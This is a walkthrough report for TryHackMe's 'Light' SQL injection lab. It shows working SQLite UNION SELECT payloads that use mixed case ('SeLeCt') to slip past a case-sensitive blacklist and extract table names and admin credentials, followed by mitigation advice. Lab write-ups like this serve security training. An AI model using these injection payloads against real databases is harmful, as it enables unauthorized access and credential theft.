# 🟩Light – Try Hack Me (THM) Walkthrough Report
**Prepared by:** Nishanth Antony  
**Date:** August 12, 2025  
**Difficulty:** Easy  
**Category:** Web Exploitation (SQL Injection)  
**Platform:** Try Hack Me (THM)  

---

## 1. Reconnaissance Steps

- **Objective:** Identify open services and test for vulnerabilities.  
- **Command Used:**
```bash
nc 10.201.63.180 1337
```

text
- **Details:**
- Prompted for password → entered `smokey`.
- Reached **username** prompt → suspected SQL injection possible.

---

## 2. Exploitation Process

1. **Tested for SQL Injection**  
 - Payload: `' OR 1=1 --`  
 - Response: Filter error – banned characters **/*, --, %0b**.

2. **Error Messages Leaked Info**  
 - Attempted: `' ORDER BY 1` → Error revealed **LIMIT 30** and SQL flavor (SQLite).

3. **Bypass Case-Sensitive Filter**  
 - Tried: `SELECT` → blocked.  
 - Used: `SeLeCt` → worked (SQLite ignores case, filter did not).

4. **Enumerated DB Version**
```mysql  
1' uNion SeLeCt sqlite_version() '1
```

text
→ Got: **3.31.1**.

5. **Enumerated Tables**
```mysql
1' uNion SeLeCt name FROM sqlite_master '1
```

text
→ Found: **admintable**.

6. **Extracted Data**  
- Username:
  ```mysql
  1' uNion SeLeCt username FROM admintable '1
  ```
  → `TryHackMeAdmin`
- Password (Flag):
  ```mysql
  ' uNion SeLeCt password FROM admintable '1
  ```
  → Flag: `THM{SQLit3_InJ3cTion_is_SimplE_nO?}`

---

## 3. Proof of Concept (PoC)

- Successfully bypassed filters and retrieved sensitive data using **case variation + union select injection**.
- No authentication bypass needed — direct flag extraction.

---

## 4. Privilege Escalation

- **Not required** — The challenge's main objective was SQL injection to retrieve the flag. No OS-level escalation implemented.

---

## 5. Mitigation Recommendations

- Use **prepared statements** or **parameterized queries**.
- Implement **case-insensitive filtering** with allowlists instead of blacklists.
- Suppress **detailed error messages** in production.
- Apply **least privilege** in the database — restrict access to sensitive tables.

---

## 6. Lessons Learned

- Case-sensitive blacklist filters can be bypassed.
- Error messages leak valuable info for crafting attacks.
- SQLite-specific queries can help map database quickly.

---

## 7. Skills Practiced

- SQL injection testing via netcat.
- Query enumeration in SQLite.
- Crafting UNION SELECT injections and bypassing filters.
- Exploiting case-sensitive filtering weaknesses.

---
